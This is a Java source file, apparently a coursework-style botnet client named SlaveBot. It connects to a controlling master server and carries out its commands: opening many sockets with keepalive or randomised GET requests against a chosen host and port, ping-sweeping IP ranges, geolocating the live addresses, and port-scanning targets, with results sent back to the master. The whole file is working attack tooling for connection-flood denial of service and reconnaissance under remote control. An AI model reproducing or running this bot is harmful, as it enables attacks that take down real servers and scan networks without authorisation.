import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.StringTokenizer;

import com.maxmind.geoip.Location;
import com.maxmind.geoip.LookupService;

class attackdetails {
	String hostname;
	String ipaddress;
	int attackport;
	Socket attacksoc;

}

public class SlaveBot {
	public static List<attackdetails> listattackdetails = new ArrayList<attackdetails>();

	public static void main(String[] args) {
		try {
			if (args.length != 4) {
				System.out.println("Format SlaveBot -h <hostname> -p <Portnumber>!! Please check");
				System.exit(0);
			} else if (args[0].equals("-h") == false || args[2].equals("-p") == false) {
				System.out.println("Format SlaveBot -h <hostname> -p <Portnumber>!! Please check");
				System.exit(0);
			}

			Socket clientsoc = new Socket(args[1], Integer.parseInt(args[3]));
			BufferedReader inputbr = new BufferedReader(new InputStreamReader(clientsoc.getInputStream()));

			while (true) {
				String inputfromserver = inputbr.readLine();
				String[] inputarray = inputfromserver.split(" ");

				if (inputarray[0].equals("connect")) {
					if (inputarray.length == 5) {
						for (int i = 0; i < Integer.parseInt(inputarray[3]); i++) {
							try {
								Socket attacksoc = new Socket(inputarray[1], Integer.parseInt(inputarray[2]));
								if (inputarray[4].equals("keepalive")) {
									attacksoc.setKeepAlive(true);
								} else if (SlaveBot.isURLPattern(inputarray[4])) {
									String random = SlaveBot.randomgen();

									String url = inputarray[1] + ":" + Integer.parseInt(inputarray[2])
											+ inputarray[4].substring(4) + random;

									PrintWriter out = new PrintWriter(
											new BufferedWriter(new OutputStreamWriter(attacksoc.getOutputStream())));
									System.out.println("url:" + url);
									out.println("GET " + url);
									out.println();

									out.flush();

									BufferedReader bufRead = new BufferedReader(
											new InputStreamReader(attacksoc.getInputStream()));

									// Commenting this because display of all
									// the data will consume high
									// memory
									/*
									 * String outStr;
									 * 
									 * // Prints each line of the response while
									 * ((outStr = bufRead.readLine()) != null) {
									 * System.out.println(outStr); }
									 */

									// Closes out buffer and writer
									bufRead.close();

									/* out.close(); */

									System.out.println("Connected to: " + attacksoc.getInetAddress().getHostAddress()
											+ ":" + attacksoc.getPort());
									System.out.println("Connected Via: " + attacksoc.getInetAddress().getLocalHost()
											+ ":" + attacksoc.getLocalPort());
									System.out.println("\nRequest : " + url);

								} else if (inputarray[4] == null) {
									System.out.println("Keepalive/URL is not available in the command");
								}

								attackdetails ad = new attackdetails();
								ad.attacksoc = attacksoc;
								ad.attackport = attacksoc.getPort();
								ad.hostname = attacksoc.getInetAddress().getHostName();
								ad.ipaddress = attacksoc.getInetAddress().getHostAddress();
								listattackdetails.add(ad);

							} catch (IOException e) {
								System.out.println(e.getMessage());
							}
						}
						// System.out.println(listattackdetails.size());
					} else {
						System.out.println("Connect <<attachhost/ip>> <<attackport>> <<maxconnetion>> !! Check format");

					}
				} else if (inputarray[0].equals("disconnect")) {

					int iphost = SlaveBot.isitiphost(inputarray[1]);
					int allflag = 0;
					if (Integer.parseInt(inputarray[2]) == 0) {
						allflag = 1;
					}
					Boolean attackhostpresent = false;

					// System.out.println(listattackdetails.size());
					Iterator<attackdetails> i = listattackdetails.iterator();
					while (i.hasNext()) {
						attackdetails now = i.next();
						if (iphost == 1) {
							if (allflag == 1) {
								if (now.ipaddress.equals(inputarray[1]) == true) {
									attackhostpresent = true;
									now.attacksoc.close();

									i.remove();
								}

							} else

							if (now.ipaddress.equals(inputarray[1]) == true
									&& now.attackport == Integer.parseInt(inputarray[2])) {
								attackhostpresent = true;
								now.attacksoc.close();

								i.remove();
							}

						} else if (iphost == 2) {
							if (allflag == 1) {
								if (now.hostname.equals(inputarray[1]) == true) {
									attackhostpresent = true;
									now.attacksoc.close();

									i.remove();

								}
							} else

							if (now.hostname.equals(inputarray[1]) == true
									&& now.attackport == Integer.parseInt(inputarray[2])) {
								attackhostpresent = true;
								now.attacksoc.close();

								i.remove();

							}
						}
						// System.out.println(i.toString());
					}
					System.out.println("Done closing");

					if (!attackhostpresent) {
						System.out.println("There is no attack host/ip/port combination present to disconnect");
					}
				} else if (inputarray[0].equals("geoipscan")) {
					// System.out.println("Inside geoIPScan");
					if (inputarray.length == 2) {
						String[] ips = inputarray[1].split("-");
						if (ips.length == 2) {
							Map<String, String> listvalidipsgeoloc = geoIPScan(ips[0], ips[1]);
						//	System.out.println(listvalidipsgeoloc.toString());
							PrintWriter pw = new PrintWriter(new OutputStreamWriter(clientsoc.getOutputStream()));
							pw.println(listvalidipsgeoloc.toString());
							pw.flush();		
							
							

						} else {
							System.out.println("Invalid format string!!Should be of the format ipstart-ipend");
						}

					} else {
						System.out.println("geoipscan rangeipstart-rangeipend  !! Check format");
					}
				}

				else if (inputarray[0].equals("ipscan")) {
					// System.out.println("Inside ipscan");
					if (inputarray.length == 2) {
						String[] ips = inputarray[1].split("-");
						if (ips.length == 2) {
							ArrayList<String> listvalidips = IPScan(ips[0], ips[1]);
							// System.out.println(listvalidips.toString());
							PrintWriter pw = new PrintWriter(new OutputStreamWriter(clientsoc.getOutputStream()));
							pw.println(listvalidips.toString());
							pw.flush();

						} else {
							System.out.println("Invalid format string!!Should be of the format ipstart-ipend");
						}

					} else {
						System.out.println("ipscan rangeipstart-rangeipend  !! Check format");
					}
				}

				else if (inputarray[0].equals("tcpportscan")) {
					if (inputarray.length == 3) {
						String[] ports = inputarray[2].split("-");
						if (ports.length == 2) {
							ArrayList<Integer> listvalidports = portScan(inputarray[1], Integer.parseInt(ports[0]),
									Integer.parseInt(ports[1]));
							// System.out.println(listvalidips.toString());
							PrintWriter pw = new PrintWriter(new OutputStreamWriter(clientsoc.getOutputStream()));
							pw.println(listvalidports.toString());
							pw.flush();

						} else {
							System.out.println("Invalid format string!!Should be of the format portstart-portend");
						}

					} else {
						System.out.println(
								"tcpportscan IPAddressorhostnameorall rangeportstart-rangeportend  !! Check format");
					}
				} else {
					System.out.println("Send only connect or disconnect!!!");
				}
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			System.out.println(e.getMessage());
		}

	}

	static int isitiphost(String inputarray) {
		String ip4Regex = "^(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[0-9]{1,2})(\\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[0-9]{1,2})){3}$";

		if (inputarray.matches(ip4Regex)) {
			return 1;
		} else
			return 2;

	}

	static String randomgen() {

		final String AB = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		SecureRandom rnd = new SecureRandom();
		StringBuilder random = new StringBuilder(10);
		for (int i = 0; i < 10; i++)
			random.append(AB.charAt(rnd.nextInt(AB.length())));

		return random.toString();

	}

	static boolean isURLPattern(String urlpattern) {

		if (urlpattern.equals("url=/#q="))
			return true;
		else
			return false;
	}

	static ArrayList<String> IPScan(String startip, String endip) {

		ArrayList<String> activeips = new ArrayList<String>();

		try {
			long start = host2long(startip);
			long end = host2long(endip);
			for (long i = start; i <= end; i++) {
				if (isIPValid(long2dotted(i))) {
					activeips.add(long2dotted(i));
				}
			}
		} catch (Exception e) {
			// e.printStackTrace();
		}

		return activeips;
	}

	static Map<String, String> geoIPScan(String startip, String endip) {

		Map<String, String> activeips = new HashMap<String, String>();

		try {
			long start = host2long(startip);
			long end = host2long(endip);
			for (long i = start; i <= end; i++) {
				if (isIPValid(long2dotted(i))) {
				//	System.out.println("Im here");
					LookupService cl = new LookupService(
							"GeoLiteCity.dat",
							LookupService.GEOIP_MEMORY_CACHE | LookupService.GEOIP_CHECK_CACHE);

					Location location = cl.getLocation(String.valueOf(long2dotted(i)));
					String loc = "";
					if (location != null) {
						loc = location.countryName + "," + location.city + "," + location.postalCode + ","
								+ location.region + "," + location.area_code + "," + location.dma_code + ","
								+ location.latitude + "," + location.latitude + "," + location.metro_code;

					} else {
						loc = "Location not found in the Database";
					}
					
					activeips.put(long2dotted(i), loc);
				}
			}
		} catch (Exception e) {
			 e.printStackTrace();
		}

		return activeips;
	}

	public static long host2long(String host) {
		long ip = 0;
		if (!Character.isDigit(host.charAt(0)))
			return -1;
		int[] addr = ip2intarray(host);
		if (addr == null)
			return -1;
		for (int i = 0; i < addr.length; ++i) {
			ip += ((long) (addr[i] >= 0 ? addr[i] : 0)) << 8 * (3 - i);
		}
		return ip;
	}

	public static int[] ip2intarray(String host) {
		int[] address = { -1, -1, -1, -1 };
		int i = 0;
		StringTokenizer tokens = new StringTokenizer(host, ".");
		if (tokens.countTokens() > 4)
			return null;
		while (tokens.hasMoreTokens()) {
			try {
				address[i++] = Integer.parseInt(tokens.nextToken()) & 0xFF;
			} catch (NumberFormatException nfe) {
				return null;
			}
		}
		return address;
	}

	public static String long2dotted(long address) {
		StringBuffer sb = new StringBuffer();
		for (int i = 0, shift = 24; i < 4; i++, shift -= 8) {
			long value = (address >> shift) & 0xff;
			sb.append(value);
			if (i != 3) {
				sb.append('.');
			}
		}
		return sb.toString();
	}

	static Boolean isIPValid(String ip) {
		try {
			String command = "";
			if (System.getProperty("os.name").startsWith("Windows")) {
				command = "ping -n 1 " + ip;
			} else {
				command = "ping -c 1 " + ip;
			}
			Runtime r = Runtime.getRuntime();
			Process p = r.exec(command);
			Thread.sleep(5000);
			if (p.exitValue() != 0) {
				return false;
			} else {
				return true;
			}

		} catch (Exception e) {
			return false;

		}
	}

	/*
	 * try { List<String> commands = new ArrayList<String>();
	 * commands.add("ping"); commands.add("-w"); commands.add("5000");
	 * commands.add(ip); commands.add("-n"); commands.add("1"); ProcessBuilder
	 * processbuilder = new ProcessBuilder(commands); Process process =
	 * processbuilder.start(); Thread.sleep(5000); if (process.exitValue() != 0)
	 * { System.out.println(ip + ":false"); return false; } else {
	 * System.out.println(ip + ":true"); return true; }
	 * 
	 * } catch (Exception e) { e.printStackTrace();
	 * 
	 * } return false;
	 * 
	 * }
	 */

	/*
	 * InetAddress host; try { host = InetAddress.getByName(ip);
	 * 
	 * // System.out.println("ip : " + ip + ":" + host.isReachable(5000));
	 * return host.isReachable(5000);
	 * 
	 * } catch (UnknownHostException e) { // TODO Auto-generated catch block
	 * e.printStackTrace(); } catch (IOException e) { // TODO Auto-generated
	 * catch block e.printStackTrace(); } return null;
	 * 
	 * }
	 */

	static ArrayList<Integer> portScan(String host, int startport, int endport) {

		ArrayList<Integer> activeports = new ArrayList<Integer>();
		for (int i = startport; i <= endport; i++) {
			try {
				Socket socket = new Socket(host, i);
				activeports.add(i);
				socket.close();
			} catch (Exception e) {

			}
		}
		return activeports;
	}

}
